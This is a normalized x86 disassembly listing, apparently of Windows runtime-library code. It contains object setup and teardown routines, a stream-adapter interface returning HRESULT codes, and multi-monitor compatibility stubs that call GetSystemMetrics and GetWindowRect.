mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_442e6c
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_442ec8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c600
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_443080
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_44c070
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_442f60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442f94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442fc8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ eax ]
call [ edx + 0x10 ]
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_443034
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_443058
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c264
pop ecx
pop ecx
pop ebp
retn
sub_443080
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0xc ]
call sub_43c2dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0xc ]
call sub_43c464
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_4430dc
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov al [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] al
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_443134
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_443184
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4431e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_443200
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_44c4bc#7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_44327c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_44c4bc#6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x14 ] 0x0
jl r-xdata
mov [ ebp - 0x4 ] 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp + 0xc ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov cx [ ebp + 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cdq
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
sub_443308
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_44c4bc#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
call sub_43eac4
cdq
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x80004005
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_443378
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_44e404
xor eax eax
push ebp
push sub_443569
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
xor eax eax
push ebp
push sub_443542
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_44ba5c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_443531
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_44ba74
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x28 ]
mov [ eax ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x14 ]
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
cdq
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x2c ]
add [ ebp - 0x28 ] eax
adc [ ebp - 0x24 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
sub [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jg r-xdata
call sub_44c848
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443570
lea eax [ ebp + 0xc ]
call sub_44e3d0
retn
sub_4435cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443650
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
call sub_43eac4
cdq
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x10 ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x1c ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x24 ] edx
mov eax [ ebp + 0xc ]
mov [ eax + 0x2c ] 0x1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44366c
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x80004001
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_44368c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4436f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4436fa
mov eax [ rw-data ]
call sub_43ca60
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c464
call sub_44c070
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_44371c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4437c8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4437cf
retn
mov eax [ rw-data ]
call sub_43bbdc
mov eax [ rw-data ]
call sub_448ef8
call sub_44368c
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
xor edx edx
xor eax eax
call sub_43f930
mov eax [ rw-data ]
call sub_44c070
xor eax eax
mov [ rw-data ] eax
call sub_401140
mov eax [ eax + 0x4 ]
call sub_44c070
call sub_4420e0
mov eax [ rw-data ]
call sub_44c070
xor eax eax
mov [ rw-data ] eax
mov eax sub_443708
call sub_44e214
push rw-data
call DeleteCriticalSection
sub_4437d4
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jae r-xdata
pop ebp
retn
push rw-data
call InitializeCriticalSection
mov eax sub_443708
call sub_44e20c
mov dl 0x1
mov eax [ r-xdata ]
call sub_448dbc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c874
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c874
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c874
mov [ rw-data ] eax
sub_44384c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0xc ]
call sub_44cf14
xor eax eax
push ebp
push sub_443923
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44392a
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44cf24
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_44384c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
call sub_44cae0
sub_44394c
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
add eax 0xffffffb4
sub eax 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp + 0x8 ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetSystemMetrics
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] 0x1
dec eax
sub eax 0x2
jae r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub_4439f0
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x12340042
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
push 0x1
call [ rw-data ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx + 0x4 ]
jle r-xdata
sub_443a90
push ebp
mov ebp esp
add esp 0xffffffd0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x12340042
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call GetWindowRect
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call GetWindowPlacement
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4439f0
mov [ ebp - 0x4 ] eax
sub_443b3a
add [ eax ] al
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x12340042
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_443bbf
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
call [ rw-data ]
mov edx [ ebp + 0xc ]
mov [ edx + 0xc ] eax
push 0x1
call [ rw-data ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0xc ]
lea esi [ ebp - 0x14 ]
lea edi [ eax + 0x14 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x4c
jb r-xdata
mov [ ebp - 0x1 ] 0x1
push r-xdata
mov eax [ ebp + 0xc ]
add eax 0x28
push eax
call lstrcpyA
sub_443cd8
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
call [ rw-data ]
mov edx [ ebp + 0xc ]
mov [ edx + 0xc ] eax
push 0x1
call [ rw-data ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0xc ]
lea esi [ ebp - 0x14 ]
lea edi [ eax + 0x14 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x4c
jb r-xdata
mov [ ebp - 0x1 ] 0x1
push r-xdata
mov eax [ ebp + 0xc ]
add eax 0x28
push eax
call lstrcpyA
sub_443dd8
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
call [ rw-data ]
mov edx [ ebp + 0xc ]
mov [ edx + 0xc ] eax
push 0x1
call [ rw-data ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0xc ]
lea esi [ ebp - 0x14 ]
lea edi [ eax + 0x14 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x4c
jb r-xdata
mov [ ebp - 0x1 ] 0x1
push r-xdata
mov eax [ ebp + 0xc ]
add eax 0x28
push eax
call lstrcpyA
sub_443ed8
push ebp
mov ebp esp
add esp 0xffffffd0
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_44384c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn 0x10
xor eax eax
